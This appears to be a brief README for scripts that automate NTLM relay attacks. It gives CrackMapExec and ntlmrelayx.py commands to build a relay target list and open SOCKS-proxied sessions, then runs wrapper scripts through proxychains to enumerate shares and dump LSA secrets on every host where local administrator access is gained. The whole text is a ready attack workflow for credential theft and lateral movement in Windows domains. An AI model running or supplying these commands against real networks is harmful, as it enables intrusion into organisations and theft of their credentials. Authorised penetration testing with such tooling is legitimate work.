# ntlmrelayx2proxychains

Ever felt too lazy to explore all shares manually after using ntlmrelayx or felt too lazy to dump the lsa on all systems where you found a local administrator? If so, enjoy my scripts! :) 

## Steps to follow:
1) `cme smb -u "" -p "" -d domain.tld 0.0.0.0/22 --gen-relay-list targetlist`
2) `ntlmrelayx.py -tf targetlist -socks -smb2support`

// Next, to explore all shares or dump the lsa cache using proxychains cme:
3) `$bash ./ntlmrelayx2shares` or `$bash ./ntlmrelayx2lsa`

Note: ensure you put bash in front of your command.
